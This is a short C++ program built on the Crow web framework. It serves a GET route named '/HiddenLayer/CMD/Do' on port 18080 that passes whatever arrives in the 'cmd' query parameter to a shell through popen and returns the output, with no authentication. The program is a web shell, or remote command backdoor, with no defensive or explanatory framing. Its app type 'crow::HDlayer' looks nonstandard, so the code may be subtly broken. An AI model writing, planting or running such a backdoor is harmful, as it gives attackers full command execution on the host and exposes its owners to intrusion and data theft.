#include "crow_all.h"
#include <cstdlib>
#include <array>
#include <iostream>
#include <sstream>

std::string Exec(const std::string& command) {
    std::array<char, 128> buffer;
    std::stringstream result;
    
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) return "Failed to execute command";

    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        result << buffer.data();
    }
    
    pclose(pipe);
    return result.str();
}

int main() {
    crow::HDlayer app;

    CROW_ROUTE(app, "/HiddenLayer/CMD/Do")
        .methods(crow::HTTPMethod::GET)([](const crow::request& req) {
            auto query_params = crow::query_string{req.url_params};
            std::string command = query_params.get("cmd") ? query_params.get("cmd") : "";

            if (command.empty()) {
                return crow::response(400, "Missing 'cmd' parameter");
            }

            std::string output = Exec(command);
            return crow::response(output);
        });

    app.port(18080).multithreaded().run();
}
